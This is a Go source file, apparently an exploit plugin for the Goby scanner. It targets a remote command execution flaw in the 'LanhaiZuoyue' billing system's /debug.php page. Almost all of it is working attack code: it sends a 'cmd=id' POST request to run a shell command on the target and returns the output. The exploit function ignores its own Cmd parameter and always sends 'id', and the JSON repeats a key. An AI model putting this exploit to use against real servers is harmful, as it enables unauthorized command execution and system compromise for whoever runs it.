package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "LanhaiZuoyue system debug.php RCE",
  "Description": "LanhaiZuoyue system debug.php RCE",
  "Product": "LanhaiZuoyue system",
  "Homepage": "https://www.cuoshui.com",
  "DisclosureDate": "2021-05-18",
  "Author": "PeiQi",
  "GobyQuery": "title=\"蓝海卓越计费管理系统\"",
  "Level": "1",
  "Impact": "RCE",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": null,
  "ExpParams": [
    {
      "name": "Cmd",
      "type": "input",
      "value": "id"
    }
  ],
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["RCE"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["LanhaiZuoyue system"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri := "/debug.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "cmd=id"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "uid")
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    cmd := ss.Params["Cmd"].(string)
		    uri := "/debug.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "cmd=id"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			    if resp.StatusCode == 200 {
            		expResult.Output = resp.Utf8Html
            		expResult.Success = true
        	    }
			}
			return expResult
		},
	))
}